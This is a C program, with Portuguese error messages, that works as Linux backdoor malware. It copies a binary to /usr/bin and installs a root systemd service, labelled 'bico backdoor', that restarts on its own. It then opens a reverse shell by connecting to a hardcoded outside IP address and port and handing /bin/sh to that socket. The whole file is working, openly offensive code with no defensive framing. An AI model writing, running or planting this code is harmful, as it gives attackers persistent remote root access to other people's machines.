#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

#define BIN_PATH "/usr/bin/bico"
#define SERVICE_PATH "/etc/systemd/system/bico.service"
#define REMOTE_IP "54.232.216.110"
#define REMOTE_PORT 16499

int setup_socket(const char *ip, int port) {
    int sock;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

int install_binary() {
    if (access("./bico", F_OK) != 0) {
        fprintf(stderr, "Arquivo ./bico não encontrado\n");
        return -1;
    }

    if (system("cp ./bico " BIN_PATH " && chmod +x " BIN_PATH) != 0) {
        fprintf(stderr, "Falha ao instalar o binário\n");
        return -1;
    }

    return 0;
}

int create_service_file() {
    FILE *f = fopen("/tmp/bico.service", "w");
    if (!f) {
        perror("fopen");
        return -1;
    }

    fprintf(f,
        "[Unit]\n"
        "Description=bico backdoor\n"
        "After=network.target\n\n"
        "[Service]\n"
        "ExecStart=" BIN_PATH "\n"
        "Restart=always\n"
        "User=root\n"
        "StandardOutput=journal\n"
        "StandardError=journal\n"
        "RestartSec=5\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    );
    fclose(f);

    if (system("mv /tmp/bico.service " SERVICE_PATH) != 0 ||
        system("systemctl daemon-reload") != 0 ||
        system("systemctl enable bico.service") != 0 ||
        system("systemctl start bico.service") != 0) {
        fprintf(stderr, "Erro ao configurar o serviço\n");
        return -1;
    }

    return 0;
}

void spawn_shell(int sock) {
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl("/bin/sh", "sh", NULL);
}

int main() {
    if (install_binary() != 0) return 1;
    if (create_service_file() != 0) return 1;

    int sock = setup_socket(REMOTE_IP, REMOTE_PORT);
    if (sock < 0) return 1;

    spawn_shell(sock);
    return 0;
}
